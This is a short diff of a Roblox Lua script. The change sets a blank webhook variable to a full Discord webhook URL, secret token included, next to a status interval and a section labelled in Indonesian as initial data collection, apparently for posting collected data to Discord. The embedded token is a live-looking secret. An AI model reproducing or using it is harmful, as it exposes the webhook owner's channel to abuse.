@@ -9,7 +9,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local UserInputService = game:GetService("UserInputService")
 
 local LocalPlayer = Players.LocalPlayer
-local WebhookURL = "" 
+local WebhookURL = "https://discord.com/api/webhooks/1470165343824773183/viphYr_d2s_ry6tVuN3NWOrc_zEXkIZ8H-Yort1JSeyl5KxDZQqoRnloe4CAs6b_FvuI" 
 local StatusInterval = 300 
 
 -- [ PENGUMPULAN DATA AWAL ] --
